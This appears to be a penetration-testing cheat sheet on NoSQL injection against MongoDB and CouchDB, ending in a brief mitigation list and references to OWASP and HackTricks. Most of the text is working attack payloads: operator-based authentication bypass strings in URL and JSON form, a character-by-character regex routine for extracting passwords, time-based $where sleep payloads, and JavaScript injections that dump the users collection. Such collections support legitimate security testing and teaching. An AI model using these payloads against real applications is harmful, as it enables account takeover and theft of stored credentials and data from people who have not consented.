# NoSQL Injection

> Many NoSQL databases (MongoDB, CouchDB, Cassandra, etc.) are vulnerable to injection when applications pass unsanitized objects or strings into queries.

## Summary

- [Detection](#detection)
- [MongoDB Operators](#mongodb-operators)
- [Authentication Bypass](#authentication-bypass)
- [Boolean-Based Blind](#boolean-based-blind)
- [Time-Based Blind](#time-based-blind)
- [JavaScript Injection in MongoDB](#javascript-injection-in-mongodb)
- [CouchDB Mango](#couchdb-mango)
- [Mitigation](#mitigation)
- [References](#references)

## Detection

```
user[$ne]=anything&pass[$ne]=anything
user[$gt]=&pass[$gt]=
user='||1==1//
{"$ne": null}
{"$gt": ""}
```

A response that succeeds for "impossible" credentials indicates injection.

## MongoDB Operators

| Operator | Meaning |
|----------|---------|
| `$eq` | equal |
| `$ne` | not equal |
| `$gt` / `$gte` | greater than / or equal |
| `$lt` / `$lte` | less than / or equal |
| `$in` | in array |
| `$nin` | not in |
| `$exists` | field present |
| `$regex` | regex match |
| `$where` | JS evaluation |
| `$or` / `$and` / `$not` / `$nor` | logical |

## Authentication Bypass

### URL params → object

```
?user[$ne]=invalid&pass[$ne]=invalid
?user[$regex]=^admin&pass[$ne]=invalid
?user[$gt]=&pass[$gt]=
?user[$in][]=admin&pass[$ne]=invalid
```

### JSON body

```json
{"user": {"$ne": null}, "pass": {"$ne": null}}
{"user": "admin", "pass": {"$ne": null}}
{"user": {"$regex": "^adm"}, "pass": {"$ne": null}}
{"user": "admin", "pass": {"$gt": ""}}
{"$where": "1==1"}
{"$or": [{"user":"admin"},{"user":"administrator"}]}
```

## Boolean-Based Blind

Iterate password char-by-char:

```json
{"user":"admin","pass":{"$regex":"^a"}}
{"user":"admin","pass":{"$regex":"^b"}}
...
{"user":"admin","pass":{"$regex":"^ad"}}
```

Login success → next character confirmed.

## Time-Based Blind

```json
{"$where": "sleep(5000) || true"}
{"user":"admin","$where":"this.password.match(/^a/) && sleep(5000)"}
```

## JavaScript Injection in MongoDB

If `$where` accepts user input:

```js
this.username == 'admin'
this.username == 'admin' && this.password.length > 5
this.username == 'admin' && sleep(5000)
0;return true
0;return db.users.find()
';return(true);var x='
```

(Modern MongoDB disables server-side JS by default with `security.javascriptEnabled: false`.)

## CouchDB Mango

```json
{"selector":{"user":"admin","pass":{"$regex":"."}}}
{"selector":{"_id":{"$gt":null}}}
```

CouchDB also exposes raw HTTP API — `_all_docs`, `_users`, `_design/...` endpoints can leak data when ACLs are weak.

## Mitigation

- **Cast inputs** to expected types before querying. If `username` should be a string, reject objects.
- Set framework body parsers to **disallow nested objects** for sensitive fields (`req.body.user` should never be `{"$ne":null}`).
- **Disable server-side JS** in MongoDB (`$where`, `mapReduce`).
- Use **parameterized query builders** (e.g. Mongoose schemas with strict typing).
- Apply **least-privilege roles** to the application's DB user.

## References

- [OWASP — Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [HackTricks — NoSQL](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
